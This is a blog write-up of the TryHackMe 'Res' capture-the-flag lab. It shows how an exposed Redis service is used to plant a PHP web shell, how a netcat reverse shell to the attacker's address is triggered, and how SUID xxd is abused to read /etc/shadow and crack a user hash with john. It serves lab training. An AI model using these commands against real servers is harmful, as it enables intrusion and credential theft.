---
layout: post
title:  "Tryhackme: Res"
date:   2021-01-30 19:57:56 +0200
categories: tryhackme
---

## Nmap Scan ##
Let's start up our usual scan:
```
sudo nmap -sSCV -T5 10.10.213.47 -p- -oN=nmapScan -vv 
```
```
Nmap scan report for 10.10.213.47
Host is up, received echo-reply ttl 63 (0.059s latency).
Scanned at 2021-01-30 15:33:31 EST for 138s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
6379/tcp open  redis   syn-ack ttl 63 Redis key-value store 6.0.7
```
Interestingly, the target seems to be running ```redis 6.0.7``` on port ```6379```.

## Setting Foothold ##
Using ```redis-cli -h 10.10.213.47 -p 6379``` we get to execute commands inside ```Redis```'s CLI. Let's try to enumerate this service:
```
10.10.213.47:6379> info
# Server
redis_version:6.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:5c906d046e45ec07
redis_mode:standalone
os:Linux 4.4.0-189-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin                                                                                       
gcc_version:5.4.0                                                                                                  
process_id:605                                                                                                     
run_id:004c265c859ac6ca4ce8b01bdbc8c241b6f6342c                                                                    
tcp_port:6379                                                                                                      
uptime_in_seconds:3014                                                                                             
uptime_in_days:0                                                                                                   
hz:10                                                                                                              
configured_hz:10                                                                                                   
lru_clock:1428818                                                                                                  
executable:/home/vianka/redis-stable/src/redis-server                                                              
config_file:/home/vianka/redis-stable/redis.conf                                                                   
io_threads_active:0                                                                                                
                                                                                                                   
# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0
tracking_clients:0
clients_in_timeout_table:0

# Memory
used_memory:588008
used_memory_human:574.23K
used_memory_rss:4788224
used_memory_rss_human:4.57M
used_memory_peak:607416
used_memory_peak_human:593.18K
used_memory_peak_perc:96.80%
used_memory_overhead:541522
used_memory_startup:524536
used_memory_dataset:46486
used_memory_dataset_perc:73.24%
allocator_allocated:661616
allocator_active:937984
allocator_resident:3174400
total_system_memory:1038393344
total_system_memory_human:990.29M
used_memory_lua:37888
used_memory_lua_human:37.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.42
allocator_frag_bytes:276368
allocator_rss_ratio:3.38
allocator_rss_bytes:2236416
rss_overhead_ratio:1.51
rss_overhead_bytes:1613824
mem_fragmentation_ratio:8.78
mem_fragmentation_bytes:4242728
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:16986
mem_aof_buffer:0
mem_allocator:jemalloc-5.1.0
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1612038540
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0
module_fork_in_progress:0
module_fork_last_cow_size:0

# Stats
total_connections_received:4
total_commands_processed:4
instantaneous_ops_per_sec:0
total_net_input_bytes:113
total_net_output_bytes:59671
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
expire_cycle_cpu_milliseconds:57
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0
tracking_total_keys:0
tracking_total_items:0
tracking_total_prefixes:0
unexpected_error_replies:0
total_reads_processed:11
total_writes_processed:7
io_threaded_reads_processed:0
io_threaded_writes_processed:0

# Replication
role:master
connected_slaves:0
master_replid:135aac75d98ed991e12b47fe956b9a0a7f3ebd75
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:2.000000
used_cpu_user:1.336000
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

# Modules

# Cluster
cluster_enabled:0

# Keyspace
```
Looks like we got a user here:
```
executable:/home/vianka/redis-stable/src/redis-server
```

### Getting a reverse shell

Giving the server a bind shell:
```
10.10.49.220:6379> config set dir /var/www/html
OK
10.10.49.220:6379> config set dbfilename bind-shell.php
OK
10.10.49.220:6379> set test "<?php system($_GET['cmd']); ?>"
OK
10.10.49.220:6379> save
OK
```
Starting a listener:
```
nc -lvnp 4444
```
Accessing the bind-shell:
```
http://10.10.49.220/bind-shell.php?cmd=nc -e /bin/bash 10.8.135.88 4444
```

### Stabilising the shell
```
which python
/usr/bin/python
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$ export TERM=xterm
export TERM=xterm
www-data@ubuntu:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg                              
```
Now let's get the user flag:
```
www-data@ubuntu:/var/www/html$ cat /home/vianka/user.txt 
```

## Privilege Escalation
As we can see, ```xxd``` can has the ```SUID``` bit set:
```
www-data@ubuntu:/var/www/html$ find / -perm -u=s 2>/dev/null
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/ping6
/bin/umount
/usr/bin/chfn
/usr/bin/xxd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
```
Using [GTFOBins] (https://gtfobins.github.io/gtfobins/xxd/) we can use ```xxd``` to view ```/etc/shadow```:
```
www-data@ubuntu:/var/www/html$ LFILE=/etc/shadow
www-data@ubuntu:/var/www/html$ xxd "$LFILE" | xxd -r
root:!:18507:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18506:0:99999:7:::
uuidd:*:18506:0:99999:7:::
vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
```
Also get content of ```/etc/passwd```:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
vianka:x:1000:1000:Res,,,:/home/vianka:/bin/bash
```
Let's ```unshadow``` the hash and put ```john``` on it. We will save the contents of ```/etc/shadow``` in ```shadows``` and the contents of ```/etc/passwd``` in ```passwords```.
```
unshadow passwords shadows > unshadows
john --wordlist=/usr/share/wordlists/rockyou.txt unshadows
john --show unshadows
```
Now we got our user passowrd!
And finally, let's also get the root flag using the same technique:
```
www-data@ubuntu:/var/www/html$ LFILE=/root/root.txt
www-data@ubuntu:/var/www/html$ xxd "$LFILE" | xxd -r
```